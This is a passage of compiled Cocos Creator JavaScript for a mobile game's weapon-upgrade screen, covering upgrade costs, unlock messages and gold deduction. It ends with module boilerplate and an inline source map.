        if (powerLv >= cfg['lv_limit']) {
            this.powerCostLabel.string = "<b><outline color=#1e1e1e width=3>\u6EE1\u7EA7</outline></b>";
            this.powerButton.interactable = false;
        }
        else {
            var needCost = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.WeaponUp)[powerLv - 1]['power_expend'];
            this.powerCostLabel.string = "<b><outline color=#1e1e1e width=3>" + Extend_1.ext.shortFormat(needCost) + "</outline></b>";
            this.powerButton.interactable = World_1.World.Storage.goldCount >= needCost;
        }
        this.powerCostLabel.node.color = this.powerButton.interactable ? cc.Color.WHITE : cc.Color.RED.fromHEX("#924338");
        var hurt_add = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.WeaponUp)[powerLv - 1]['hurt_add'];
        this.powerWorthLabel.string = "<b><outline color=#1e1e1e width=3>" + Math.floor(hurt_add * 100) + "%</outline></b>";
    };
    WeaponLayerController.prototype.onClickWeapon = function (event, data) {
        console.log("【click】WeaponLayerController Weapon");
        data = parseInt(data);
        var cfg = this._orders[data - 2];
        var bLock = World_1.World.Storage.gameLevel < cfg['unlock'];
        if (bLock) {
            Toast_1.default.flutter({ string: "<color=#faffff><b><outline color=#1e1e1e width=4>\u7B2C" + cfg['unlock'] + "\u5173\u89E3\u9501\u8BE5\u6B66\u5668</outline></b></color>", fontSize: 30, y: cc.visibleRect.center.y });
        }
        else {
            this.weaponButtons[this._weaponFocus].node.getChildByName("Background").getChildByName("weaponSprite").active = true;
            this.weaponButtons[this._weaponFocus].node.getChildByName("Background").getChildByName("weapon").active = false;
            this.weaponFocus = data - 2;
        }
    };
    WeaponLayerController.prototype.onClickUpWeaponFirePower = function (event, data) {
        console.log("【click】WeaponLayerController UpWeaponFirePower");
        var cfg = this._orders[this._weaponFocus];
        var id = cfg['id'];
        var firePowerLv = World_1.World.My.armory.levelOfEmitterFirePower(id);
        if (firePowerLv >= World_1.World.Storage.ADLv) {
            Toast_1.default.flutter({ string: "<color=#faffff><b><outline color=#1e1e1e width=4>等级不得高于基础战斗力</outline></b></color>", fontSize: 30, y: cc.visibleRect.center.y });
            return;
        }
        var needCost = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.WeaponUp)[firePowerLv - 1]['fire_expend'];
        World_1.World.Storage.goldCount -= needCost;
        World_1.World.My.armory.addLevelOfEmitterFirePower(id, 1);
        this.updateFirePower();
        Facade_1.default.canvasNode.emit("WeaponUp");
    };
    WeaponLayerController.prototype.onClickUpWeaponPower = function (event, data) {
        console.log("【click】WeaponLayerController UpWeaponPower");
        var cfg = this._orders[this._weaponFocus];
        var id = cfg['id'];
        var powerLv = World_1.World.My.armory.levelOfEmitterPower(id);
        if (powerLv >= World_1.World.Storage.ADLv) {
            Toast_1.default.flutter({ string: "<color=#faffff><b><outline color=#1e1e1e width=4>等级不得高于基础战斗力</outline></b></color>", fontSize: 30, y: cc.visibleRect.center.y });
            return;
        }
        var needCost = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.WeaponUp)[powerLv - 1]['power_expend'];
        World_1.World.Storage.goldCount -= needCost;
        World_1.World.My.armory.addLevelOfEmitterPower(id, 1);
        this.updatePower();
        Facade_1.default.canvasNode.emit("WeaponUp");
    };
    WeaponLayerController.prototype.onClickToggle = function (toggle, data) {
        console.log("【click】WeaponLayerController Toggle");
        if (toggle.isChecked) {
            if (World_1.World.Storage.unlockGun > 0) {
                /** 切换focus */
                var index = this._orders.findIndex(function (value) { return value['id'] == World_1.World.Storage.unlockGun; });
                console.log("index===>", index);
                if (typeof index == "undefined") {
                    console.error("not found gun for id===>", World_1.World.Storage.unlockGun);
                }
                else {
                    this.weaponFocus = index;
                    /** 播放流光动画 */
                    this.weaponButtons[index].node.getChildByName("Background").getChildByName("weaponSprite").active = false;
                    this.weaponButtons[index].node.getChildByName("Background").getChildByName("weapon").active = true;
                    this.weaponButtons[index].node.getChildByName("Background").getChildByName("weapon").getComponent(sp.Skeleton).setAnimation(0, "gun_002", true);
                }
            }
        }
    };
    __decorate([
        property(cc.RichText)
    ], WeaponLayerController.prototype, "firePowerLvLabel", void 0);
    __decorate([
        property(cc.RichText)
    ], WeaponLayerController.prototype, "powerLvLabel", void 0);
    __decorate([
        property(cc.RichText)
    ], WeaponLayerController.prototype, "firePowerCostLabel", void 0);
    __decorate([
        property(cc.RichText)
    ], WeaponLayerController.prototype, "powerCostLabel", void 0);
    __decorate([
        property(cc.RichText)
    ], WeaponLayerController.prototype, "firePowerWorthLabel", void 0);
    __decorate([
        property(cc.RichText)
    ], WeaponLayerController.prototype, "powerWorthLabel", void 0);
    __decorate([
        property(cc.Button)
    ], WeaponLayerController.prototype, "firePowerButton", void 0);
    __decorate([
        property(cc.Button)
    ], WeaponLayerController.prototype, "powerButton", void 0);
    __decorate([
        property(cc.ScrollView)
    ], WeaponLayerController.prototype, "scrollView", void 0);
    __decorate([
        property(cc.Node)
    ], WeaponLayerController.prototype, "upEffectNode", void 0);
    __decorate([
        property(cc.Node)
    ], WeaponLayerController.prototype, "trialNode", void 0);
    WeaponLayerController = __decorate([
        ccclass
    ], WeaponLayerController);
    return WeaponLayerController;
}(cc.Component));
exports.default = WeaponLayerController;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2hvbWUvV2VhcG9uTGF5ZXJDb250cm9sbGVyLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7QUFDQSx1Q0FBb0M7QUFHcEMsMkRBQXFEO0FBQ3JELHlEQUFvRDtBQUNwRCxxRUFBa0U7QUFDbEUsNkRBQTBEO0FBQzFELDJEQUFzRDtBQUVoRCxJQUFBLEtBQXNCLEVBQUUsQ0FBQyxVQUFVLEVBQWxDLE9BQU8sYUFBQSxFQUFFLFFBQVEsY0FBaUIsQ0FBQztBQUcxQztJQUFtRCx5Q0FBWTtJQUEvRDtRQUFBLHFFQW1QQztRQWhQRyxzQkFBZ0IsR0FBZ0IsSUFBSSxDQUFDO1FBR3JDLGtCQUFZLEdBQWdCLElBQUksQ0FBQztRQUdqQyx3QkFBa0IsR0FBZ0IsSUFBSSxDQUFDO1FBR3ZDLG9CQUFjLEdBQWdCLElBQUksQ0FBQztRQUduQyx5QkFBbUIsR0FBZ0IsSUFBSSxDQUFDO1FBR3hDLHFCQUFlLEdBQWdCLElBQUksQ0FBQztRQUdwQyxxQkFBZSxHQUFhLElBQUksQ0FBQztRQUdqQyxpQkFBVyxHQUFhLElBQUksQ0FBQztRQUc3QixnQkFBVSxHQUFpQixJQUFJLENBQUM7UUFHaEMsa0JBQVksR0FBVyxJQUFJLENBQUM7UUFHNUIsZUFBUyxHQUFXLElBQUksQ0FBQztRQUV6QixtQkFBYSxHQUFlLEVBQUUsQ0FBQztRQUV2QixrQkFBWSxHQUFHLENBQUMsQ0FBQyxDQUFDO1FBc0JsQixhQUFPLEdBQUcsRUFBRSxDQUFDOztJQXdMekIsQ0FBQztJQTVNRywwQ0FBVSxHQUFWO1FBQ0ksT0FBTyxJQUFJLENBQUMsT0FBTyxDQUFDLElBQUksQ0FBQyxZQUFZLENBQUMsQ0FBQyxJQUFJLENBQUMsQ0FBQztJQUNqRCxDQUFDO0lBR0Qsc0JBQUksOENBQVc7YUFBZixVQUFnQixLQUFhO1lBQTdCLGlCQVFDO1lBUEcsSUFBSSxJQUFJLENBQUMsWUFBWSxJQUFJLEtBQUssRUFBQztnQkFDM0IsSUFBSSxDQUFD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